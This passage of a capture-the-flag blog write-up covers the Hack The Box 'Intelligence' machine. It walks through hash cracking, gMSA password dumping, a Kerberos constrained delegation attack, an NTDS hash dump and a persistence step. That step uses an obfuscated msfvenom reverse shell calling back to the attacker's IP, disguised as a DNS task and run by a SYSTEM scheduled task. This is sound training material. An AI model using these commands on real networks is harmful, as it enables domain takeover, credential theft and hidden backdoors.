+<h3 id="cracking-teds-hash-using-hashcat">Cracking Teds Hash using Hashcat:</h3>
+<ul>
+<li><strong>I use hashcat to cracks Ted&rsquo;s password</strong>:
+<ul>
+<li><code>hashcat -m 5600 ted.hash ~/Wordlists/rockyou.txt</code></li>
+<li><figure><img src="/ox-hugo/2024-09-29-102210_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="running-bloodhound-as-ted-graves">Running Bloodhound as Ted Graves:</h3>
+<ul>
+<li>As we have Ted&rsquo;s creds we can run the python collector for bloodhound.
+<ul>
+<li><code>python3 bloodhound.py -dc dc.intelligence.htb -c All -u $user -p $pass -d intelligence.htb -ns $box</code></li>
+<li>We can see that Ted part of the <code>ITSUPPORT</code> group and this group has the ability to read the <code>GMSAPassword</code> of the host <code>SVC_INT$</code>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-104906_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>Looking further we can see that the host <code>SVC_INT$</code> has the constrained delegation privilege over the Domain Controller <code>DC.INTELLIGENCE.HTB</code> this gives us a clear attack path as we can perform a constrained delegation attack.
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-163508_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="using-gmsadumper-dot-py-to-dump-the-gmsa-password">Using <code>gMSADumper.py</code> to dump the <code>gMSA</code> Password:</h3>
+<ul>
+<li>
+<p><strong>I dump the</strong> <code>gMSA</code> <strong>Password using</strong> <a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper.py</a></p>
+<ul>
+<li><code>python3 gMSADumper.py -u $user -p $pass -d intelligence.htb</code></li>
+<li><figure><img src="/ox-hugo/2024-09-29-153724_.png">
+</figure>
+
+<ul>
+<li>The first line is the <code>NTLM</code> hash of the <code>SVC_INT$</code> machine account.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I verify the hash is valid using netexec</strong>:</p>
+<ul>
+<li><code>netexec smb $box -u svc_int$ -H $hash --shares</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-154021_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="what-is-gmsa-and-gmsa-password">What is gMSA &amp; gMSA Password?:</h4>
+<ul>
+<li>
+<p><strong>gMSA (Group Managed Service Account)</strong>:</p>
+<ul>
+<li>A <code>gMSA</code> is a type of service account in Active Directory that is designed to enhance security and reduce administrative overhead for service accounts. They provide automatic password management &amp; simplified service principal name (SPN) management.</li>
+</ul>
+</li>
+<li>
+<p><strong>The password for a</strong> <code>gMSAccount</code> <strong>is a</strong> <code>gMSA</code> <strong>password</strong>:</p>
+<ul>
+<li>They are automatically generated by Active Directory &amp; 240 characters long !!! So not even worth trying to crack</li>
+<li>They are automatically rotated regularly:
+<ul>
+<li>(default is 30 days)</li>
+</ul>
+</li>
+<li>They are not known or accessible to administrators.</li>
+</ul>
+</li>
+<li>
+<p><strong>Some further points about</strong> <code>gMSA</code> <strong>passwords</strong>:</p>
+<ul>
+<li>They eliminate the need for manual password resets as they are handled by the system.</li>
+<li>The password is managed by the domain controllers</li>
+<li>Authorized hosts can retrieve the current password when needed</li>
+<li>This approach significantly reduces the risk of password-related security issues</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-ownership">4. Ownership:</h2>
+<h3 id="1-dot-clock-synchronization-to-ensure-kerberos-tickets-are-valid">1. Clock Synchronization To Ensure Kerberos Tickets Are Valid:</h3>
+<ul>
+<li>
+<p><strong>Sync The Clock of our Attack Host with the Target</strong>:</p>
+<ul>
+<li>I sync my clock with the host, this is crucially important as Kerberos has time based checks when authorizing we need to ensure our times our synced with our target.
+<ul>
+<li>The error you will see if your clock is not synced:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-161841_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>If you are on kali do the following</strong>:</p>
+<ul>
+<li><code>sudo apt install ntpdate</code>
+<ul>
+<li>Ensure that you have the host in your <code>/etc/hosts</code> file &amp; then run: <code>sudo ntpdate -s intelligence.htb</code> this will sync your clocks.
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-161947_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-dot-kerberos-constrained-delegation--kcd--attack">2. Kerberos Constrained Delegation (KCD) Attack:</h3>
+<ul>
+<li><strong>I launch the constrained delegation attack</strong>:
+<ul>
+<li><code>impacket-getST -spn WWW/dc.intelligence.htb 'INTELLIGENCE.HTB/svc_int' -impersonate Administrator -dc-ip $box -hashes :$hash</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-161418_.png">
+</figure>
+</li>
+<li>Despite getting a lot of errors I still get a <code>.cacche</code> file.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="constrained-delegation-kcd-attack-explained">Constrained Delegation KCD Attack Explained:</h4>
+<ol>
+<li>
+<p><strong>Compromise a Service Account</strong>:</p>
+<ul>
+<li>We need to gain control of a service account that has been configured for constrained delegation.</li>
+<li>We have control over <code>svc_int$</code> computer account</li>
+</ul>
+</li>
+<li>
+<p><strong>Identify Delegation Targets</strong>:</p>
+<ul>
+<li>Enumerates the services which our compromised account is allowed to delegate to.
+<ul>
+<li>We know we can delegate to <code>WWW/dc.intelligence.htb</code> which is a service running on the Domain Controller</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Request a TGT</strong>: Handled by <code>impacket-getST</code></p>
+<ul>
+<li>We requests a Ticket Granting Ticket (TGT) for the compromised service account.</li>
+</ul>
+</li>
+<li>
+<p><strong>Request a Service Ticket</strong>: <code>impacket-getST</code></p>
+<ul>
+<li>Using the TGT, the we requests a service ticket for one of the allowed delegation targets.</li>
+<li>We specify the user they want to impersonate in this case it will be the <code>Administrator</code> account.</li>
+</ul>
+</li>
+<li>
+<p><strong>S4U2Self</strong>: <code>impacket-getST</code></p>
+<ul>
+<li>The Key Distribution Center (KDC) performs an <code>S4U2Self</code> (Service for User to Self) operation.</li>
+<li>This creates a service ticket as if the impersonated user (Administrator) had requested it.</li>
+</ul>
+</li>
+<li>
+<p><strong>S4U2Proxy</strong>: <code>impacket-getST</code></p>
+<ul>
+<li>The KDC then performs an <code>S4U2Proxy</code> (Service for User to Proxy) operation.</li>
+<li>This allows the service ticket to be used for delegation to the target service.</li>
+</ul>
+</li>
+<li>
+<p><strong>Access Target Service</strong>:</p>
+<ul>
+<li>We can now use this ticket to access the target service, appearing as the impersonated user.</li>
+</ul>
+</li>
+</ol>
+<h3 id="3-dot-load-the-dot-ccache-into-memory-with-the-krb5ccname-variable">3. Load the <code>.ccache</code> into memory with the <code>KRB5CCNAME</code> variable:</h3>
+<ul>
+<li>
+<p><strong>First I rename the</strong> <code>.ccache</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-164539_.png">
+</figure>
+</li>
+<li><strong>Note</strong>: The only reason I do this is because it&rsquo;s neater visually, there is no other reason to do this other than personal preference, that is all.</li>
+</ul>
+</li>
+<li>
+<p><strong>Load the</strong> <code>.ccache</code> <strong>into the</strong> <code>KRB5CCNAME</code> <strong>variable</strong>:</p>
+<ul>
+<li>The <code>KRB5CCNAME</code> environment is variable used by Kerberos 5 (KRB5) as a pointer to the <code>.cacche</code> which actually stores the creds.</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-dot-getting-a-shell-using-impacket-psexec">4. Getting a shell using impacket-psexec:</h3>
+<ul>
+<li>
+<p>As we have the <code>KRB5CCNAME</code> variable pointing at our <code>.ccache</code> file we can use kerberos authentication get a shell:</p>
+<ul>
+<li><code>impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass -dc-ip $box -target-ip $box</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-165744_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Root flag obtained</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-165757_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="5-dot-ownership">5. Ownership:</h2>
+<h3 id="dumping-ntds-using-netexec-and-our-kerberos-credentials">Dumping NTDS using netexec and our kerberos credentials:</h3>
+<ul>
+<li>
+<p>As <code>netexec</code> also allows kerberos authentication we can dump the <code>NTDS</code> database to extract all the hashes from the DC.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-165910_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I verify the Administrators hash works by creating starting a session using</strong> <code>evil-winrm</code>:</p>
+<ul>
+<li><code>evil-winrm -i $box -u administrator -H $hash</code></li>
+<li><figure><img src="/ox-hugo/2024-09-29-170148_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="6-dot-persistence">6. Persistence:</h2>
+<h3 id="creating-a-windows-scheduled-task-to-enable-a-backdoor-dot">Creating a windows scheduled task to enable a backdoor.</h3>
+<ul>
+<li>
+<p>I understand this is a box but I want to demonstrate how we can achieve persistence:</p>
+</li>
+<li>
+<p><strong>I create an obfuscated shell using msfvenom</strong>:</p>
+<ul>
+<li><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=53 -a x86 --platform windows -e x86/shikata_ga_nai -i 100 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o dnsTask.exe</code>
+<ul>
+<li>I use port <code>53</code> &amp; call it <code>dnsTask.exe</code> as a way to make it appear like a normal <code>DNS</code> task connecting to a <code>DNS</code> server.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I upload this to the target via</strong> <code>evil-winrm</code> <strong>to</strong> <code>C:\Windows</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-171504_.png">
+</figure>
+</li>
+<li>I upload it to the <code>C:\Windows</code> folder as a further way to make it look authentic.</li>
+</ul>
+</li>
+<li>
+<p><strong>I create a scheduled task to execute my shell every 1 minute</strong>:</p>
+<ul>
+<li><code>schtasks /create /sc minute /mo 1 /tn &quot;dnsTask&quot; /tr C:\Windows\dnsTask.exe /ru &quot;SYSTEM&quot;</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-171640_.png">
+</figure>
+</li>
+<li><strong>Command Breakdown</strong>:
+<ul>
+<li><code>schtasks</code>: The command-line utility in Windows used to create, delete, configure, or display scheduled tasks.</li>
+<li><code>/create</code>: This option tells schtasks to create a new scheduled task.</li>
+<li><code>/sc minute</code>: This specifies the schedule frequency for the task. In this case, it will run every minute.</li>
+<li><code>/mo 1</code>: Modifies the frequency (modifier) to occur every 1 minute.</li>
+<li><code>/tn &quot;dns&quot;</code>: The task&rsquo;s name is &ldquo;dnsTask&rdquo;.</li>
+<li><code>/tr C:\dnsTask.exe</code>: The task will run the script or command C:\tools\shell.cmd.</li>
+<li><code>/ru &quot;SYSTEM&quot;</code>: This specifies that the task will run under the SYSTEM&quot;~ user account, which gives it high-level privileges.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I start my listener in</strong> <code>nc.exe</code></p>
+<ul>
+<li><code>nc -nvlp 53</code></li>
+<li>And…..nothing, I believe my shell is being caught by defender.
+<ul>
+<li>I will need to find another way, but that can wait for another day.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>I learned that users may or may not be able to add DNS entries (super clear I know.)</li>
+<li>I never had considered using DNS as a means to for spoofing before which was a cool thing to do.</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>I didn&rsquo;t specify the <code>SPN</code> the first time when running the <code>KCD</code> attack.</li>
+<li>I ran bloodhound a little too late. This was mainly due to having issues with <code>bloodhound.py</code> but after setting it up in a <code>venv</code> it was fine.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at proton dot me</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        3845
+                    
+                </li>
+            
+
+            
+            
+
+            
+                <li>en</li>
+            
+
+            
+                <li>
+                    <a href="https://gohugo.io" class="btn" target="_blank"
+                        >Hugo: 0.135.0</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    <a
+                        href="https://github.com/JingWangTW/dark-theme-editor"
+                        class="btn"
+                        target="_blank"
+                        >Theme: dark-theme-editor</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Jan 01 0001 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+                <li title="">
+                    
+                </li>
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
